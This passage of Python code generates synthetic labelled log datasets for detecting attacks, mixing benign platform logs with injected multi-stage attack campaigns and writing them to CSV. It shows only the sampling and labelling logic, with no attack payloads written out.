    dt: datetime = field(default=None, repr=False)

    def as_row(self) -> dict:
        return {
            "log_id": self.log_id, "platform": self.platform,
            "timestamp": self.timestamp_text, "raw": self.raw,
            "label": self.label, "stage": self.stage,
            "campaign": self.campaign, "attack_type": self.attack_type,
        }


def _build_platform(platform: str, rng: random.Random, start: datetime) -> List[LogRecord]:
    n_total = config.PLATFORM_COUNTS[platform]
    n_anom = int(round(n_total * config.PLATFORM_RATIOS[platform]))
    n_benign = n_total - n_anom
    window = timedelta(hours=config.DATASET_HOURS)
    records: List[LogRecord] = []

    benign_pool = BENIGN_TEMPLATES[platform]
    info_idx = [i for i, (lvl, _) in enumerate(benign_pool) if lvl == "INFO"]
    warn_idx = [i for i, (lvl, _) in enumerate(benign_pool) if lvl == "WARN"]
    err_idx = [i for i, (lvl, _) in enumerate(benign_pool) if lvl == "ERROR"]

    def make_benign(dt: datetime) -> LogRecord:
        ctx = _make_ctx(rng)
        r = rng.random()
        if r < config.BENIGN_ERROR_FRACTION and err_idx:
            lvl, body = benign_pool[rng.choice(err_idx)]
        elif r < config.BENIGN_ERROR_FRACTION + config.BENIGN_WARN_FRACTION and warn_idx:
            lvl, body = benign_pool[rng.choice(warn_idx)]
        else:
            lvl, body = benign_pool[rng.choice(info_idx or range(len(benign_pool)))]
        body = body.format(**ctx)
        raw = _render(platform, dt, lvl, body, ctx)
        invalid = rng.random() < config.INVALID_TS_BENIGN
        ts_text = rng.choice(_INVALID_TS) if invalid else format_ts(platform, dt)
        if invalid:
            raw = raw.replace(format_ts(platform, dt), ts_text, 1)
        return LogRecord("", platform, ts_text, raw, 0, -1, "", "", dt)

    for _ in range(n_benign):
        dt = start + timedelta(seconds=rng.uniform(0, window.total_seconds()))
        records.append(make_benign(dt))

    # ---- inject attack campaigns -----------------------------------------
    anomaly_records: List[LogRecord] = []
    campaign_templates = CAMPAIGNS[platform]
    cid = 0
    while len(anomaly_records) < n_anom and cid < 10 * n_anom:
        seq = campaign_templates[rng.randrange(len(campaign_templates))]
        t0 = start + timedelta(seconds=rng.uniform(0, window.total_seconds() * 0.98))
        campaign_records: List[LogRecord] = []
        for j, stage in enumerate(seq):
            variants = stage_variants(platform, stage)
            subtle_pool = [v for v in variants if v[2]]
            overt_pool = [v for v in variants if not v[2]]
            use_subtle = rng.random() < config.SUBTLE_ANOMALY_FRACTION and bool(subtle_pool)
            pool = subtle_pool if use_subtle else (overt_pool or subtle_pool)
            _, body, _ = rng.choice(pool)
            dt = t0 + timedelta(seconds=30 * j + rng.uniform(0, 20))
            ctx = _make_ctx(rng)
            lvl = _sample_level(rng, use_subtle)
            body = body.format(**ctx)
            body = _force_level(platform, lvl, body)
            if not use_subtle:
                body = _add_payload(platform, body, ctx, rng)
            rendered = _render(platform, dt, lvl, body, ctx)
            invalid = rng.random() < config.INVALID_TS_ANOMALY
            ts_text = rng.choice(_INVALID_TS) if invalid else format_ts(platform, dt)
            if invalid:
                rendered = rendered.replace(format_ts(platform, dt), ts_text, 1)
            campaign_records.append(LogRecord(
                "", platform, ts_text, rendered, 1, config.STAGE_INDEX[stage],
                f"{platform}-C{cid:04d}", stage, dt))
        anomaly_records.extend(campaign_records)
        cid += 1

    # trim / pad to the exact anomaly count
    if len(anomaly_records) > n_anom:
        by_campaign: Dict[str, List[LogRecord]] = {}
        for r in anomaly_records:
            by_campaign.setdefault(r.campaign, []).append(r)
        kept: List[LogRecord] = []
        for c, rs in by_campaign.items():
            for r in rs:
                if len(kept) < n_anom:
                    kept.append(r)
        anomaly_records = kept
    while len(anomaly_records) < n_anom:
        seq = campaign_templates[0]
        stage = seq[0]
        variants = stage_variants(platform, stage)
        _, body, _ = rng.choice(variants)
        dt = start + timedelta(seconds=rng.uniform(0, window.total_seconds()))
        ctx = _make_ctx(rng)
        lvl = _sample_level(rng, False)
        body = _force_level(platform, lvl, body.format(**ctx))
        body = _add_payload(platform, body, ctx, rng)
        rendered = _render(platform, dt, lvl, body, ctx)
        anomaly_records.append(LogRecord(
            "", platform, format_ts(platform, dt), rendered, 1,
            config.STAGE_INDEX[stage], f"{platform}-C{cid:04d}", stage, dt))
        cid += 1

    records.extend(anomaly_records)
    records.sort(key=lambda r: r.dt)
    for i, r in enumerate(records):
        r.log_id = f"{platform}-{i:05d}"
    return records


def generate_extended_dataset(seed: int = 42) -> List[LogRecord]:
    rng = random.Random(seed)
    start = datetime.fromisoformat(config.DATASET_START)
    all_records: List[LogRecord] = []
    for platform in config.PLATFORMS:
        all_records.extend(_build_platform(platform, rng, start))
    return all_records


def generate_darpa_pairs(n: int, seed: int = 7) -> List[LogRecord]:
    """Stage-labelled (log, attack stage) pairs in the spirit of DARPA TC."""
    rng = random.Random(seed)
    start = datetime.fromisoformat(config.DATASET_START)
    combos: List[Tuple[str, str]] = sorted(STAGE_TEMPLATES.keys())
    by_stage: Dict[str, List[Tuple[str, str]]] = {}
    for platform, stage in combos:
        by_stage.setdefault(stage, []).append((platform, stage))

    out: List[LogRecord] = []
    i = 0
    while len(out) < n:
        stage = config.STAGES[i % config.N_STAGES]
        platform = rng.choice(by_stage[stage])[0]
        variants = stage_variants(platform, stage)
        _, body, _ = rng.choice(variants)
        dt = start + timedelta(seconds=rng.uniform(0, config.DATASET_HOURS * 3600))
        ctx = _make_ctx(rng)
        lvl = _sample_level(rng, False)
        body = _force_level(platform, lvl, body.format(**ctx))
        body = _add_payload(platform, body, ctx, rng)
        rendered = _render(platform, dt, lvl, body, ctx)
        out.append(LogRecord(
            f"DARPA-{len(out):05d}", platform, format_ts(platform, dt), rendered,
            1, config.STAGE_INDEX[stage], "", stage, dt))
        i += 1
    rng.shuffle(out)
    return out


def write_csv(records: List[LogRecord], path: Path) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    with open(path, "w", newline="", encoding="utf-8") as fh:
        writer = csv.DictWriter(fh, fieldnames=list(records[0].as_row().keys()))
        writer.writeheader()
        for r in records:
            writer.writerow(r.as_row())


def build_datasets(force: bool = False) -> Tuple[Path, Path]:
    ext_path = config.DATA_DIR / "extended_logs.csv"
    darpa_path = config.DATA_DIR / "darpa_tc_stage_pairs.csv"
    if force or not ext_path.exists():
        recs = generate_extended_dataset()
        write_csv(recs, ext_path)
    if force or not darpa_path.exists():
        train = generate_darpa_pairs(config.DARPA_TRAIN_PAIRS + config.DARPA_TEST_PAIRS, seed=7)
        write_csv(train, darpa_path)
    return ext_path, darpa_path
